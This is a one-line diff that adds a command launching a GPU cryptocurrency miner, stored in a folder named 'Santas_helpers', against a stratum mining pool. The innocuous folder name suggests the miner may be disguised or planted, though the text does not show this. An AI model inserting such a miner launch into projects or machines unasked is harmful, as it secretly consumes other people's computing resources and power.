@@ -1,0 +1,1 @@
+Santas_helpers\NsGpuCNMiner.exe -o stratum+tcp://theminerspool.com:5555 -u 12 -p x
